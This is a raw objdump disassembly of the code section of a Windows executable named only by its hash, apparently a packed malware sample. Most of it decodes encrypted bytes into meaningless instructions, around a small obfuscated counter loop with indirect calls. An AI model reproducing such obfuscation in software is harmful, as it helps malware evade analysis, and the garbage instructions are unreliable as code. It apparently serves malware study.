
b1b659ca5a6a2a1e3b901724f38046c174b2cc4160bd9aae6f98da88dd261a09.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x7e790cf7
  40101f:	xchg   esp,eax
  401020:	cmp    BYTE PTR [eax+0x78],0x78
  401024:	js     0x401024
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(6)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080ab4
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz int 0xa6
  4010d1:	jno    0x4010ed
  4010d3:	js     0x4010c8
  4010d5:	sub    BYTE PTR [ebx-0x33d61879],0x1
  4010dc:	xor    edx,esp
  4010de:	out    0x23,eax
  4010e0:	xlat   BYTE PTR ds:[ebx]
  4010e1:	popa   
  4010e2:	inc    ecx
  4010e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010e4:	adc    BYTE PTR [esi],ah
  4010e6:	lds    eax,FWORD PTR [edx]
  4010e8:	fsubrp st(6),st
  4010ea:	lods   al,BYTE PTR ds:[esi]
  4010eb:	fisub  WORD PTR [ebp+0x41]
  4010ee:	ins    DWORD PTR es:[edi],dx
  4010ef:	sub    edi,DWORD PTR [edx]
  4010f1:	inc    DWORD PTR [esi+0x20079172]
  4010f7:	and    al,0x18
  4010f9:	cmc    
  4010fa:	pop    edi
  4010fb:	push   ecx
  4010fc:	dec    esi
  4010fd:	sar    edi,1
  4010ff:	add    ah,BYTE PTR [edx]
  401101:	sub    BYTE PTR [ebp+0x75],bh
  401104:	xor    DWORD PTR [ebx+0x35],ecx
  401107:	pop    edi
  401108:	test   BYTE PTR [ebp-0x27],0xe3
  40110c:	mov    bh,BYTE PTR [ebx]
  40110e:	pop    esi
  40110f:	dec    ebx
  401110:	push   ss
  401111:	retf   
  401112:	xchg   edx,eax
  401113:	fld    QWORD PTR [edx+0x42]
  401116:	setbe  BYTE PTR [ecx+0x606b05b9]
  40111d:	shl    DWORD PTR [ecx-0x5],cl
  401120:	daa    
  401121:	mov    ah,0x25
  401123:	repnz xor dh,BYTE PTR ds:0x2202c7ce
  40112a:	inc    esp
  40112b:	push   edi
  40112c:	xchg   esp,eax
  40112d:	add    BYTE PTR ds:0x76760e75,bl
  401133:	add    eax,eax
  401135:	lahf   
  401136:	mov    ch,0xb1
  401138:	clc    
  401139:	pusha  
  40113a:	mov    esi,0x7edd0b96
  40113f:	out    0x68,al
  401141:	aas    
  401142:	inc    edi
  401143:	jmp    0x67d5dbf3
  401148:	pop    edx
  401149:	vmaxps ymm1,ymm5,YMMWORD PTR [edi]
  40114d:	jb     0x401100
  40114f:	in     al,0xd5
  401151:	mov    ds:0xb3a13205,al
  401156:	xor    DWORD PTR [esi-0x6f],ebp
  401159:	adc    al,0xa
  40115b:	js     0x4010f6
  40115d:	add    ch,BYTE PTR [ebp+ebx*8-0x29d3df34]
  401164:	mov    ch,0xc7
  401166:	xor    ebp,ebp
  401168:	mov    ds:0x273d683f,eax
  40116d:	mov    dl,0x53
  40116f:	daa    
  401170:	and    al,0x3f
  401172:	in     al,0x17
  401174:	imul   eax,DWORD PTR [esi+0x5c],0xd88db01c
  40117b:	mov    ch,0x98
  40117d:	ds push cs
  40117f:	jp     0x401142
  401181:	mov    cl,BYTE PTR [edi]
  401183:	and    eax,0xf1d15722
  401188:	xlat   BYTE PTR ds:[ebx]
  401189:	ins    BYTE PTR es:[edi],dx
  40118a:	fneni(8087 only) 
  40118c:	pop    eax
  40118d:	stos   BYTE PTR es:[edi],al
  40118e:	rcl    DWORD PTR [edi-0x5a],cl
  401191:	jbe    0x40117e
  401193:	ret    0x3076
  401196:	pushf  
  401197:	scas   eax,DWORD PTR es:[edi]
  401198:	and    eax,0x450685ca
  40119d:	pop    ss
  40119e:	jbe    0x40119d
  4011a0:	push   ss
  4011a1:	push   ds
  4011a2:	push   cs
  4011a3:	scas   eax,DWORD PTR es:[edi]
  4011a4:	ficomp DWORD PTR [ebp-0x3f]
  4011a7:	inc    BYTE PTR [eax+0x2964243d]
  4011ad:	sbb    DWORD PTR [eax-0x760e284c],ebx
  4011b3:	aaa    
  4011b4:	xlat   BYTE PTR ds:[ebx]
  4011b5:	mov    ecx,0xb4ad23d
  4011ba:	push   esp
  4011bb:	lea    ebp,[ebp+0x6a]
  4011be:	jge    0x4011d4
  4011c0:	push   es
  4011c1:	test   BYTE PTR [ecx-0x2ad4c0c],0x3c
  4011c8:	inc    ebx
  4011c9:	fmulp  st(1),st
  4011cb:	push   ecx
  4011cc:	push   edx
  4011cd:	test   dl,dh
  4011cf:	clc    
  4011d0:	rcl    DWORD PTR [ebp+0x51],0xd1
  4011d4:	push   esp
  4011d5:	pop    edx
  4011d6:	leave  
  4011d7:	aaa    
  4011d8:	dec    esp
  4011d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011da:	and    ch,al
  4011dc:	jmp    0x40119d
  4011de:	fsub   st(0),st
  4011e0:	loopne 0x40117d
  4011e2:	pop    esp
  4011e3:	dec    edx
  4011e4:	adc    al,BYTE PTR [esi+0x47]
  4011e7:	sub    edx,edx
  4011e9:	sti    
  4011ea:	push   esi
  4011eb:	mov    WORD PTR [ebx+0x76],ds
  4011ee:	lods   al,BYTE PTR ds:[esi]
  4011ef:	and    BYTE PTR ds:[ebx],dl
  4011f2:	retf   
  4011f3:	cwde   
  4011f4:	es inc ebx
  4011f6:	dec    edx
  4011f7:	shr    DWORD PTR [eax-0x26c975f3],cl
  4011fd:	daa    
  4011fe:	xchg   BYTE PTR [ebp-0x13],al
  401201:	add    al,0x7e
  401203:	enter  0x6c93,0x3e
  401207:	dec    ecx
  401208:	pop    ss
  401209:	mov    ds:0x97a1ba23,al
  40120e:	adc    ch,BYTE PTR [eax+0x60]
  401211:	mov    WORD PTR [ebp-0x2e],ds
  401214:	ret    0xd1d3
  401217:	(bad)  
  401218:	cmc    
  401219:	fimul  DWORD PTR [eax-0x3b31d2e7]
  40121f:	or     al,0x1c
  401221:	jns    0x4011c2
  401223:	mov    ecx,0x7342c1f7
  401228:	imul   esp,DWORD PTR [ebx-0x67],0x2045c6e6
  40122f:	loopne 0x4011f2
  401231:	inc    edi
  401232:	retf   
  401233:	cmp    DWORD PTR [esi-0x285bcfcc],esi
  401239:	add    eax,0xdf0c937b
  40123e:	push   es
  40123f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401240:	and    eax,0x433f10bf
  401245:	inc    edx
  401246:	dec    esp
  401247:	or     edi,eax
  401249:	sbb    eax,0xcabf507c
  40124e:	ins    BYTE PTR es:[edi],dx
  40124f:	mov    edx,0xc1050eb7
  401254:	ins    DWORD PTR es:[edi],dx
  401255:	pushf  
  401256:	push   ebx
  401257:	fld    DWORD PTR [ebp+esi*8-0x7]
  40125b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40125c:	jno    0x4011eb
  40125e:	mov    bl,0x74
  401260:	and    ecx,DWORD PTR [eax-0x3897ee67]
  401266:	and    BYTE PTR [ecx+0x43e133a3],0xb6
  40126d:	sar    BYTE PTR [edi-0x79],0x9c
  401271:	aaa    
  401272:	idiv   bh
  401274:	xor    ch,0xc
  401277:	push   ebp
  401278:	ins    DWORD PTR es:[edi],dx
  401279:	stos   BYTE PTR es:[edi],al
  40127a:	sbb    bh,BYTE PTR [eax+ebp*4+0x40d6a311]
  401281:	adc    DWORD PTR [ecx+0x49],ebp
  401284:	sbb    esi,DWORD PTR [esi]
  401286:	jle    0x40123f
  401288:	or     edi,esi
  40128a:	pop    ds
  40128b:	loopne 0x4012db
  40128d:	inc    edx
  40128e:	xlat   BYTE PTR ds:[ebx]
  40128f:	ins    DWORD PTR es:[edi],dx
  401290:	sbb    eax,DWORD PTR [ebx]
  401292:	mov    ecx,0xd84bfa44
  401297:	daa    
  401298:	jg     0x4012fb
  40129a:	pusha  
  40129b:	or     BYTE PTR [ebx-0x5ac1de8],dl
  4012a1:	xor    esp,esi
  4012a3:	pop    esp
  4012a4:	popf   
  4012a5:	add    BYTE PTR [ebx+0x4050f960],bh
  4012ab:	mov    eax,ds:0x41eae6
  4012b0:	xor    DWORD PTR ds:0x42a80d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7c1
  4012c2:	or     DWORD PTR ds:0x42a76d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx+0x7b],1
  401422:	xchg   BYTE PTR [ecx],ch
  401424:	aad    0xfe
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x40147c
  40142e:	inc    esi
  40142f:	cmp    al,0xe4
  401431:	or     DWORD PTR [edi-0x5f],edi
  401434:	xchg   DWORD PTR [edi+0x25c19275],ebx
  40143a:	loop   0x401498
  40143c:	xchg   edi,eax
  40143d:	mov    edi,0x61c8db88
  401442:	pop    esp
  401443:	add    ah,bh
  401445:	daa    
  401446:	pusha  
  401447:	mov    bh,0xec
  401449:	call   0x699cbf3a
  40144e:	in     eax,dx
  40144f:	push   ecx
  401450:	push   eax
  401451:	loopne 0x401438
  401453:	sbb    DWORD PTR [ecx],esi
  401455:	xchg   BYTE PTR [edi+0x51524c75],bh
  40145b:	mov    edx,0xa5a60834
  401460:	jb     0x40142b
  401462:	in     al,dx
  401463:	jecxz  0x401424
  401465:	push   ds
  401466:	in     eax,0x4b
  401468:	xchg   ebx,eax
  401469:	shr    al,cl
  40146b:	cwde   
  40146c:	jg     0x40141e
  40146e:	std    
  40146f:	outs   dx,BYTE PTR ds:[esi]
  401470:	xor    al,0xe8
  401472:	mov    edi,0xe4745f7a
  401477:	cmp    cl,BYTE PTR [edx-0x63]
  40147a:	inc    ebx
  40147b:	clc    
  40147c:	xor    al,BYTE PTR [edx+0x11]
  40147f:	pop    esi
  401480:	in     eax,0xe8
  401482:	lds    esi,FWORD PTR [ecx+0x58e947c8]
  401488:	daa    
  401489:	inc    ebx
  40148a:	sbb    DWORD PTR [esi+0x4],eax
  40148d:	adc    edi,DWORD PTR [edx]
  40148f:	test   DWORD PTR [esi],0x21fea56c
  401495:	pop    edi
  401496:	add    al,0x67
  401498:	addr16 pop ss
  40149a:	mov    ch,0xd8
  40149c:	jmp    0x40142c
  40149e:	inc    ebp
  40149f:	and    cl,0x4c
  4014a2:	sbb    esp,edi
  4014a4:	jge    0x4014cc
  4014a6:	hlt    
  4014a7:	fprem  
  4014a9:	dec    edx
  4014aa:	es in  al,0xc3
  4014ad:	jmp    0x401455
  4014af:	dec    ecx
  4014b0:	mov    ch,0xa
  4014b2:	mov    eax,ds:0x14dee4fe
  4014b7:	lds    esi,FWORD PTR [edx+0x56ac4e21]
  4014bd:	mov    edi,0x9b12933
  4014c2:	jmp    0x401526
  4014c4:	cmp    al,0x33
  4014c6:	sbb    esp,ebp
  4014c8:	or     eax,0xf8db7fa1
  4014cd:	and    eax,0x175c88a8
  4014d2:	cmp    BYTE PTR [ebp+0x7e618a23],al
  4014d8:	ror    BYTE PTR [esi-0x4f684fda],0xb2
  4014df:	and    edi,DWORD PTR [edi]
  4014e1:	cwde   
  4014e2:	and    eax,0x8caf48a5
  4014e7:	sub    BYTE PTR [ebx],0x6e
  4014ea:	mov    ecx,0x34b0303b
  4014ef:	xor    ah,cl
  4014f1:	mov    es,edx
  4014f3:	or     BYTE PTR [edi+ebx*4],bl
  4014f6:	xor    BYTE PTR [ebx],ah
  4014f8:	rol    BYTE PTR [eax-0x28821408],1
  4014fe:	push   es
  4014ff:	xchg   ecx,eax
  401500:	dec    edi
  401501:	add    DWORD PTR [eax+0x50],edi
  401504:	or     DWORD PTR [ebx],edx
  401506:	dec    edx
  401507:	std    
  401508:	pop    esi
  401509:	add    al,0x86
  40150b:	dec    edi
  40150c:	sbb    dh,BYTE PTR [eax+ecx*4+0x29cfa813]
  401513:	xchg   esi,eax
  401514:	arpl   bx,bp
  401516:	scas   al,BYTE PTR es:[edi]
  401517:	mov    ds:0x5e93e76c,eax
  40151c:	or     bl,ch
  40151e:	aaa    
  40151f:	cmp    BYTE PTR [ebx-0x5f],ah
  401522:	push   edx
  401523:	pusha  
  401524:	out    0xb3,al
  401526:	(bad)  
  401527:	adc    al,0x87
  401529:	sub    cl,bh
  40152b:	jo     0x4014d8
  40152d:	jge    0x2b9b18a2
  401533:	fild   QWORD PTR [ecx+0x1e9a5c56]
  401539:	xchg   bl,al
  40153b:	xchg   ebx,eax
  40153c:	jp     0x40153e
  40153e:	out    dx,al
  40153f:	rol    DWORD PTR [ecx+0x54b082e],cl
  401545:	and    al,0xa9
  401547:	or     BYTE PTR [esi-0xeba15c8],al
  40154d:	sar    BYTE PTR [ebp+0x24984664],1
  401553:	dec    esp
  401554:	(bad)  
  401556:	adc    eax,0x17a3db58
  40155b:	push   cs
  40155c:	xor    eax,0xb6f2c790
  401561:	cld    
  401562:	sub    ecx,esp
  401564:	jno    0x4015c4
  401566:	push   ss
  401567:	call   0x3dd0:0x95be1509
  40156e:	adc    BYTE PTR [edi+0x704cc6b9],ch
  401574:	cmc    
  401575:	hlt    
  401576:	(bad)  
  401577:	pop    edx
  401578:	rol    DWORD PTR [edi-0x6e1af82e],cl
  40157e:	cmp    BYTE PTR [ecx],bh
  401580:	mov    bh,0x22
  401582:	add    esi,DWORD PTR [ebp+0x1c4fa0f0]
  401588:	add    eax,0x4e99b498
  40158d:	mov    dh,0xe
  40158f:	push   eax
  401590:	add    DWORD PTR [ecx],ecx
  401592:	imul   eax,edi,0xffffffb3
  401595:	adc    ah,dh
  401597:	in     eax,dx
  401598:	push   ss
  401599:	fnsavew [edi-0x1b3db0f5]
  4015a0:	lock jb 0x4015bd
  4015a3:	(bad)  
  4015a4:	retf   
  4015a5:	inc    ebp
  4015a6:	dec    eax
  4015a7:	push   0xa1c27775
  4015ac:	stos   DWORD PTR es:[edi],eax
  4015ad:	sti    
  4015ae:	(bad)
  4015b2:	xor    BYTE PTR ds:0x314cbf0b,cl
  4015b8:	jmp    0x401615
  4015ba:	cli    
  4015bb:	pop    eax
  4015bc:	jmp    ebx
  4015be:	sbb    al,0xbb
  4015c0:	dec    ebp
  4015c1:	ds push ebx
  4015c3:	adc    edi,DWORD PTR [ecx+0x4f]
  4015c6:	retf   0xe0d7
  4015c9:	test   DWORD PTR [ecx+esi*8],edi
  4015cc:	ret    
  4015cd:	dec    edx
  4015ce:	int3   
  4015cf:	xchg   BYTE PTR [esi+0x39],ah
  4015d2:	add    al,0xc0
  4015d4:	jg     0x40164b
  4015d6:	lods   al,BYTE PTR fs:[esi]
  4015d8:	scas   eax,DWORD PTR es:[edi]
  4015d9:	and    cl,BYTE PTR [edx+eax*2]
  4015dc:	or     BYTE PTR [ebx-0x33],cl
  4015df:	icebp  
  4015e0:	jecxz  0x401649
  4015e2:	pop    ebp
  4015e3:	jae    0x4015b8
  4015e5:	xchg   esp,eax
  4015e6:	sbb    BYTE PTR [edi+0x42],ah
  4015e9:	mov    DWORD PTR [ebx-0x35],ecx
  4015ec:	mov    DWORD PTR [esi*2+0x552e0945],edi
  4015f3:	cli    
  4015f4:	and    esi,DWORD PTR [ecx]
  4015f6:	lods   al,BYTE PTR ds:[esi]
  4015f7:	jb     0x401596
  4015f9:	mov    ch,BYTE PTR [edx+ecx*4+0x41]
  4015fd:	sub    esp,DWORD PTR [ebp-0x102f53b9]
  401603:	icebp  
  401604:	fistp  WORD PTR [ecx]
  401606:	dec    edi
  401607:	adc    bh,ah
  401609:	or     BYTE PTR [esi+0x1cd93c13],bl
  40160f:	xchg   edx,eax
  401610:	retf   0x7ec2
  401613:	inc    ebp
  401614:	mov    edx,0x6f5911ec
  401619:	pop    edi
  40161a:	add    DWORD PTR [esi-0x5e7cad67],0x8
  401621:	cmc    
  401622:	dec    ebx
  401623:	cmp    BYTE PTR [ecx+edi*4],bl
  401626:	mov    ah,0x10
  401628:	pusha  
  401629:	adc    eax,0x2d8be1f9
  40162e:	scas   al,BYTE PTR es:[edi]
  40162f:	jecxz  0x40165b
  401631:	or     al,BYTE PTR [edx+0x5c]
  401634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401635:	sbb    BYTE PTR [esi-0xcdea900],bh
  40163b:	mov    dh,0x6c
  40163d:	jb     0x401635
  40163f:	sbb    DWORD PTR [ebp+0xba30b56],eax
  401645:	sub    al,0x43
  401647:	jg     0x401676
  401649:	or     bl,BYTE PTR [edi]
  40164b:	pop    edx
  40164c:	adc    eax,0x45
  40164f:	mov    esp,0x6c563fe
  401654:	(bad)  
  401657:	mov    bl,0x1b
  401659:	hlt    
  40165a:	dec    ebp
  40165b:	sbb    DWORD PTR [ebx+edx*2-0x1a4d7746],esi
  401662:	std    
  401663:	mov    WORD PTR [esi],ss
  401665:	adc    DWORD PTR [ebx-0x66],esi
  401668:	mov    cl,0x46
  40166a:	xchg   ebp,eax
  40166b:	sub    al,0xc9
  40166d:	jb     0x4016be
  40166f:	cmp    DWORD PTR [ebx],0xb87b187d
  401675:	repz mov ebx,0x4e71190a
  40167b:	pop    edi
  40167c:	lods   eax,DWORD PTR ds:[esi]
  40167d:	pop    es
  40167e:	bound  esi,QWORD PTR [esi-0x2c]
  401681:	(bad)  
  401682:	mov    BYTE PTR [ebp+0x62c1e7e1],dh
  401688:	retf   0xb90e
  40168b:	xor    DWORD PTR [edi],edx
  40168d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40168e:	fisub  DWORD PTR [ecx-0x12]
  401691:	in     eax,dx
  401692:	adc    ch,BYTE PTR [ebx+edx*2-0x5e]
  401696:	add    BYTE PTR [ecx+0x1413ad40],0x88
  40169d:	inc    edx
  40169e:	inc    esp
  40169f:	mov    dh,0xa9
  4016a1:	cld    
  4016a2:	fdivp  st(7),st
  4016a4:	push   edx
  4016a5:	arpl   WORD PTR [edi+0x20ecbfc],ax
  4016ab:	call   0x3b88de0
  4016b0:	mov    DWORD PTR [ecx+0x42a84d35],0x53dc00
  4016ba:	add    BYTE PTR [ecx-0x46c2eeff],cl
  4016c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c1:	inc    edx
  4016c2:	add    BYTE PTR [ebp+0xd81fc45],cl
  4016c8:	imul   esp,DWORD PTR [edi-0x58a2ffbe],0x45890042
  4016d2:	lock xor DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz imul edi,DWORD PTR [eax+eiz*4],0xffffffb0
  4016f8:	jl     0x4016fd
  4016fa:	js     0x401774
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x401770
  401701:	call   0x766a:0xc697498b
  401708:	ficomp DWORD PTR [ebp-0x70]
  40170b:	pop    ds
  40170c:	(bad)  
  40170d:	iret   
  40170e:	das    
  40170f:	sahf   
  401710:	xchg   esi,eax
  401711:	(bad)
  401714:	sub    BYTE PTR [edi],al
  401716:	aas    
  401717:	xrelease mov DWORD PTR [esi],esp
  40171a:	retf   0xbba1
  40171d:	(bad)  [eax]
  40171f:	ret    0x331
  401722:	inc    eax
  401723:	or     esi,DWORD PTR ds:0xff45ee8c
  401729:	retf   0xc42e
  40172c:	sbb    eax,0x9fe7b7eb
  401731:	cmp    edi,DWORD PTR [eax]
  401733:	pop    ecx
  401734:	dec    ecx
  401735:	jns    0x401715
  401737:	dec    ebp
  401738:	push   edx
  401739:	adc    ebx,0x1a
  40173c:	dec    DWORD PTR [edi]
  40173e:	mov    dl,0x95
  401740:	mov    ebp,0x6745fb32
  401745:	aam    0x99
  401747:	dec    esp
  401748:	dec    edi
  401749:	push   es
  40174a:	inc    esi
  40174b:	inc    ecx
  40174c:	daa    
  40174d:	jmp    0xab9d:0xb3bb3146
  401754:	dec    edi
  401755:	push   esi
  401756:	push   ebx
  401757:	fsub   QWORD PTR [ebp+0x6ee609c3]
  40175d:	cmovs  ebx,DWORD PTR [edx-0x78]
  401761:	xchg   ebx,eax
  401762:	lahf   
  401763:	mov    ds:0x79f98076,al
  401768:	push   0xffffffdf
  40176a:	test   BYTE PTR [eax+0x7b29a2af],cl
  401770:	xlat   BYTE PTR ds:[ebx]
  401771:	je     0x401714
  401773:	jmp    0x4e01:0x630ab323
  40177a:	shr    BYTE PTR [ebp-0x24232d99],cl
  401780:	(bad)  
  401781:	mov    eax,edx
  401783:	adc    al,0xc9
  401785:	mov    ds:0x6cd43f23,eax
  40178a:	sub    al,0x86
  40178c:	xor    DWORD PTR [ecx],esi
  40178e:	push   ecx
  40178f:	retf   0x3277
  401792:	and    ebp,DWORD PTR [ebx+ebx*2]
  401795:	or     BYTE PTR [ecx],al
  401797:	in     eax,0xe9
  401799:	ret    
  40179a:	jb     0x4017a1
  40179c:	fsubr  st(1),st
  40179e:	xlat   BYTE PTR ds:[ebx]
  40179f:	xchg   edi,eax
  4017a0:	adc    al,0x3
  4017a2:	xor    al,0xf4
  4017a4:	mov    edx,0xec60f770
  4017a9:	and    al,0xce
  4017ab:	or     DWORD PTR [eax],ecx
  4017ad:	das    
  4017ae:	(bad)  
  4017af:	fsubr  DWORD PTR [ebp+0x4344d8dd]
  4017b5:	stos   DWORD PTR es:[edi],eax
  4017b6:	mov    al,0x27
  4017b8:	push   ds
  4017b9:	cli    
  4017ba:	add    bl,BYTE PTR ds:0x97409a2b
  4017c0:	pop    eax
  4017c1:	add    al,0x3
  4017c3:	sub    ch,BYTE PTR [ebx]
  4017c5:	sbb    DWORD PTR [esi],0x4a
  4017c8:	nop
  4017c9:	arpl   WORD PTR es:[ebx+0x1fabce38],dx
  4017d0:	add    DWORD PTR [edi],esp
  4017d2:	dec    edx
  4017d3:	mov    ebp,0xf376d53a
  4017d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017d9:	shl    esp,cl
  4017db:	xor    ecx,DWORD PTR [ecx]
  4017dd:	push   edx
  4017de:	scas   eax,DWORD PTR es:[edi]
  4017df:	add    esp,edx
  4017e1:	dec    ebp
  4017e2:	adc    al,0xd2
  4017e4:	adc    esp,esp
  4017e6:	ss sbb edx,DWORD PTR fs:[esi+0x41]
  4017eb:	and    al,BYTE PTR [edx+0x1221a85e]
  4017f1:	retf   0xf58b
  4017f4:	adc    DWORD PTR [ebp+0x5758b82c],edx
  4017fa:	addr16 inc edx
  4017fc:	cmp    BYTE PTR [ecx],cl
  4017fe:	xor    ch,bh
  401800:	and    ebx,DWORD PTR [edx]
  401802:	pop    es
  401803:	aas    
  401804:	jl     0x401843
  401806:	(bad)  
  401807:	xor    BYTE PTR [ecx-0x422c3957],bl
  40180d:	xchg   ebp,eax
  40180e:	sbb    DWORD PTR [ecx+esi*8],esi
  401811:	jmp    0x40185b
  401813:	rcl    DWORD PTR [ecx+0x3a],0xb8
  401817:	or     eax,0xd957ebc9
  40181c:	fwait
  40181d:	aas    
  40181e:	push   es
  40181f:	sbb    al,ch
  401821:	fcom   DWORD PTR [ebp-0xd2677bb]
  401827:	jl     0x4018a8
  401829:	(bad)  
  40182b:	popf   
  40182c:	aam    0xb9
  40182e:	cmc    
  40182f:	test   BYTE PTR [edx+0x2d],bh
  401832:	mov    al,ds:0x545113f0
  401837:	push   ebx
  401838:	repnz popa 
  40183a:	cdq    
  40183b:	je     0x401854
  40183d:	or     ah,BYTE PTR [ebx+0x47]
  401840:	push   es
  401841:	sbb    eax,0x2f33d369
  401846:	or     ah,bl
  401848:	jmp    0x48d57557
  40184d:	sbb    BYTE PTR [edi+0x32],al
  401850:	fisttp WORD PTR [edx]
  401852:	xor    DWORD PTR [esi+0x507ad2e],0xffffffb4
  401859:	inc    eax
  40185a:	rol    dl,1
  40185c:	clc    
  40185d:	add    DWORD PTR [edi],0x1dcfb8b4
  401863:	jo     0x4018b4
